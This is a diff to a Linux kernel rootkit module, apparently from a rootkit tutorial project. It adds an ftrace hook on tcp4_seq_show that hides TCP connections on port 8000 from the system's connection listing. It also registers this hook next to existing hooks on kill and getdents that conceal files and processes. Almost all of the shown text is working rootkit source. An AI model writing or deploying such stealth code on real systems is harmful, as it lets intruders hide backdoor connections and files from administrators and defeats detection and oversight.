@@ -14,6 +14,34 @@ MODULE_AUTHOR("TheXcellerator");
 MODULE_DESCRIPTION("Hiding files that start with a certain prefix");
 MODULE_VERSION("0.02");
 
+
+//change defines to what you want
+#define HIDE_PORT 8000
+
+
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+
+/* This is our hook function for tcp4_seq_show */
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct inet_sock *is;
+    long ret;
+    unsigned short port = htons(HIDE_PORT);
+
+    if (v != SEQ_START_TOKEN) {
+		is = (struct inet_sock *)v;
+		if (port == is->inet_sport || port == is->inet_dport) {
+			printk(KERN_DEBUG "rootkit: sport: %d, dport: %d\n",
+				   ntohs(is->inet_sport), ntohs(is->inet_dport));
+			return 0;
+		}
+	}
+
+	ret = orig_tcp4_seq_show(seq, v);
+	return ret;
+}
+
+
 #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
 #define PTREGS_SYSCALL_STUBS 1
 #endif
@@ -405,14 +433,15 @@ void hideme(void)
 
 static struct ftrace_hook hooks[] = {
 #ifdef PTREGS_SYSCALL_STUBS
+    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("__x64_sys_kill", hook_killz, &orig_kill),
     HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
     HOOK("__x64_sys_getdents", hook_getdents, &orig_getdents),
 #else 
+    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("sys_kill", hook_kill, &orig_kill),
     HOOK("sys_getdents64", hook_getdents64, &orig_getdents64),
     HOOK("sys_getdents", hook_getdents, &orig_getdents),
-    HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
 #endif
 };
 
